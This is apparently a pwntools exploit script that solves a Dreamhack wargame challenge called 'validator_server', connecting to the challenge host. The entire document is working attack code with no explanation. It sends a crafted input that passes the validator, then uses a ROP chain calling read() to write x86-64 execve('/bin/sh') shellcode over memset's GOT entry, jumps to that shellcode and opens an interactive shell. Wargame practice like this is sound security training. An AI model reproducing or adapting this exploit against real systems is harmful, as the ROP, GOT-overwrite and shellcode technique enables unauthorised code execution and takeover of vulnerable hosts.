#!/bin/usr/python3

from pwn import *

p = remote('host3.dreamhack.games', 18082)
e = ELF('./validator_server')
payload = b'DREAMHACK!A'
val = 0x7f
for i in range(0x0b, 0x81):
    payload += val.to_bytes(1, byteorder='little')
    val -= 1
payload += b'B'*0x7

shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x31\xc0\xb8\x3b\x00\x00\x00\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05'
pop_rdi = 0x4006f3
pop_rsi_r15 = 0x4006f1
pop_rdx = 0x40057b

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(e.got['memset']) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode))
payload += p64(e.plt['read'])
payload += p64(e.got['memset'])

p.send(payload)
p.send(shellcode)
p.interactive()